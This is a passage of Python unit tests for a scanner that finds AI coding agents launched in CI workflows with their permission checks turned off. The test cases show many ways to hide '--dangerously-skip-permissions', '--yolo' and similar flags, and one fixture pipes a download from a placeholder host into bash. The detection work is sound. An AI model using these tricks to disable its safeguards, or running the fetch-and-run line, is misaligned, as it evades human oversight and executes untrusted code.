        for uses, line in [(CLAUDE, "prompt: \"Claude, please review this change. Don't approve it.\""),
                           ("slackapi/slack-github-action@" + "d" * 40, "text: \"Claude finished the review. It's ready.\"")]:
            with self.subTest(line=line):
                text = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                        f"      - uses: {uses}\n        with:\n          {line}\n")
                self.assertEqual(kinds(check(text)), [])

    def test_windows_and_github_script_without_a_command(self):
        win = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: windows-latest\n    steps:\n"
               "      - run: claude --version\n")
        self.assertEqual(kinds(check(win)), [])
        script = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                  "      - uses: actions/github-script@" + "b" * 40 + "\n        with:\n          script: |\n"
                  "            await exec.exec('npm', ['test'])\n            core.info('Reviewed by claude')\n")
        self.assertEqual(kinds(check(script)), [])

    def test_shell_and_matrix_include_and_env_written_as_one_expression(self):
        shell = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                 f"      - shell: claude {self.DSP} -p {{0}}\n        run: review\n")
        self.assertEqual(kinds(check(shell)), ["command-option"])
        include = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n"
                   "    strategy:\n      matrix:\n        include: [{c: 'claude -p x'}]\n    steps:\n"
                   "      - run: ${{ matrix.c }}\n")
        self.assertEqual(kinds(check(include)), ["command-computed"])
        env = ("on: push\npermissions: {contents: read}\nenv: {FLAGS: --model}\njobs:\n  a:\n    runs-on: ubuntu-latest\n"
               "    steps:\n      - env: ${{ fromJSON(vars.E) }}\n        run: claude -p x $FLAGS\n")
        self.assertEqual(kinds(check(env)), ["command-computed"])
        export = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n"
                  "    env: {FLAGS: --model}\n    steps:\n      - uses: actions/github-script@" + "b" * 40 + "\n"
                  "        with:\n          script: core.exportVariable('FLAGS', context.payload.comment.body)\n"
                  "      - run: claude -p x $FLAGS\n")
        self.assertEqual(kinds(check(export)), ["command-computed"])

    def test_claude_args_expansion_inside_a_value_and_codex_json(self):
        hits = found(check(one_step(CLAUDE, "          claude_args: '--permission-mode bypass${X}Permissions'\n")))
        self.assertEqual([h.kind for h in hits], ["computed"])
        one_word = found(check(one_step(CODEX, "          codex-args: '[\"--model o3 --yolo\"]'\n")))
        self.assertEqual(one_word, [])
        escaped = found(check(one_step(CODEX, "          codex-args: '[\"\\u002d-yolo\"]'\n")), "option")
        self.assertEqual([h.facts["setting"] for h in escaped], ["codex/bypass-approvals-and-sandbox"])

    def test_the_nesting_limit_is_cannot_tell(self):
        script = "claude -p x; " + "bash -c 'bash -c \"" * 0 + "sh -c 'sh -c \"sh -c \\\"sh -c \\\\\\\"sh -c x\\\\\\\"\\\"\"'"
        reading = agent_flags.read_script("x=1; " + "eval " * 0 + "claude -p x\n" + "$(" * 6 + "echo" + ")" * 6,
                                          ["claude"], [], next(r for r in agent_tools.flag_readers(load().detection)
                                                               if r[0] == "claude-code")[2], mentioned=True)
        self.assertTrue(any("nesting" in w for words in reading.unknown.values() for w in words))
        del script

    def test_runner_chains_are_linear(self):
        _t, _n, flags, programs, packages, _a = next(r for r in agent_tools.flag_readers(load().detection)
                                                     if r[0] == "claude-code")
        for word in ("nohup ", "sudo ", "env ", "find . -exec x "):
            timings = []
            for n in (1000, 4000):
                start = time.perf_counter()
                agent_flags.read_script(word * n + "claude -p x", programs, packages, flags, mentioned=True)
                timings.append(time.perf_counter() - start)
            with self.subTest(word=word):
                self.assertLess(timings[1], max(0.3, timings[0] * 6))


class ThirdReviewCasesTest(unittest.TestCase):
    """What the third review of slice 2d.5c2a found."""

    DSP = "--dangerously-skip-permissions"

    def expect(self, cases, **kw):
        for script, want in cases:
            with self.subTest(script=script):
                got = kinds(check(run_step(script, **kw)))
                if want == "hit":
                    self.assertIn("command-option", got, script)
                elif want == "cannot":
                    self.assertEqual(got, ["command-computed"], script)
                else:
                    self.assertEqual(got, [], script)

    def test_ordinary_commands_leave_variables_known(self):
        env = {"CLAUDE_FLAGS": "--max-turns 10", "MODEL": "claude-opus"}
        self.expect([
            ('export PATH="$HOME/.local/bin:$PATH"\nclaude -p "$PROMPT" $CLAUDE_FLAGS', "none"),
            ("printf 'starting\\n'\nclaude -p x $CLAUDE_FLAGS", "none"),
            ("read -r PR < pr.txt\nclaude -p x --model $MODEL", "none"),
            ('claude -p "read the diff and let me know" --max-turns $CLAUDE_FLAGS', "none"),
        ], env=env)

    def test_code_in_another_language_with_literal_arguments(self):
        d = self.DSP
        self.expect([
            ("python3 -c 'import subprocess; subprocess.run([\"claude\", \"--version\"])'", "none"),
            ("python3 <<'EOF'\nimport subprocess\nsubprocess.run([\"claude\",\"-p\",prompt,\"--output-format\",\"json\"])\nEOF", "none"),
            ("perl -e 'system \"claude --dangerously-\" . \"skip-permissions -p x\"'", "cannot"),
            ("ruby -e 'puts %x(claude --dangerously-#{\"skip\"}-permissions -p x)'", "cannot"),
            ("awk 'BEGIN { cmd = \"claude --dangerously-\" \"skip-permissions\"; print \"\" | cmd }'", "cannot"),
            (f"perl -e 'system \"claude {d}\"'", "hit"),
        ])

    def test_git_aliases_and_quoted_command_lines(self):
        d = self.DSP
        self.expect([
            (f"git -c alias.r='!claude {d} -p x' r", "hit"),
            (f"git config alias.r '!claude {d} -p x'\ngit r", "hit"),
            ('tmux new-session -d "claude -p x $FLAGS"', "cannot"),
            ('ssh host "claude -p x $FLAGS"', "cannot"),
            ("docker build -t claude --build-arg V=$V .", "none"),
            ("kubectl create secret generic claude --from-literal=key=$KEY", "none"),
            ("find claude -type f -name '*.json'", "none"),
        ])

    def test_trap_and_the_pipeline_fact(self):
        self.expect([(f"trap 'claude {self.DSP}' EXIT", "hit")])
        a = found(check(run_step("curl -s https://example.invalid/x | base64 -d | bash # claude")))[0]
        b = found(check(run_step("cat ./ok.b64 | base64 -d | bash # claude")))[0]
        self.assertNotEqual(a.facts["words"], b.facts["words"])

    def test_a_command_input_is_read_as_a_command_line(self):
        text = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                "      - uses: nick-fields/retry@" + "e" * 40 + "\n        with:\n"
                "          command: '\"$(command -v claude)\" -p x --dangerously-skip-permissions'\n")
        self.assertIn("command-computed", kinds(check(text)))

    def test_a_long_fact_is_cut_with_a_digest(self):
        self.assertEqual(agent_flags._fact_text("x" * 10), "x" * 10)
        long_a, long_b = agent_flags._fact_text("a" * 200), agent_flags._fact_text("a" * 199 + "b")
        self.assertNotEqual(long_a, long_b)
        self.assertIn("sha256:", long_a)

    def test_many_steps_that_do_not_name_a_tool_stay_cheap(self):
        steps = "".join(f"      - run: echo step {n} >> \"$GITHUB_ENV\"\n" for n in range(1500))
        text = "on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n" + steps
        start = time.perf_counter()
        check(text)
        self.assertLess(time.perf_counter() - start, 20)


class FourthReviewCasesTest(unittest.TestCase):
    """What the fourth review of slice 2d.5c2a found in bash and other shells."""

    DSP = "--dangerously-skip-permissions"

    def test_global_options_before_a_subcommand(self):
        d = self.DSP
        for script in (f"kubectl -n agents exec pod -- claude {d}", f"kubectl --namespace agents exec pod -- claude {d}",
                       f"docker --context remote run img claude {d}", f"docker -H unix:///var/run/docker.sock run img claude {d}",
                       f"podman --remote run img claude {d}", f"docker --tls run img claude {d}",
                       f"kubectl -n a --insecure-skip-tls-verify exec pod -- claude {d}",
                       f"kubectl -n build exec pod -- claude {d}", f"docker --context build run img claude {d}"):
            with self.subTest(script=script):
                self.assertIn("command-option", kinds(check(run_step(script))))

    def test_git_settings_that_run_a_command(self):
        d = self.DSP
        for script in (f"git -c diff.external='claude {d} -p' diff",
                       f"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.r GIT_CONFIG_VALUE_0='!claude {d} -p x' git r",
                       f"git config core.sshCommand 'claude {d}'"):
            with self.subTest(script=script):
                self.assertIn("command-option", kinds(check(run_step(script))))

    def test_cmd_takes_out_carets(self):
        text = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: windows-latest\n    steps:\n"
                "      - shell: cmd\n        run: claude ^--dangerously-skip-permissions -p x\n")
        self.assertEqual(kinds(check(text)), ["command-option"])
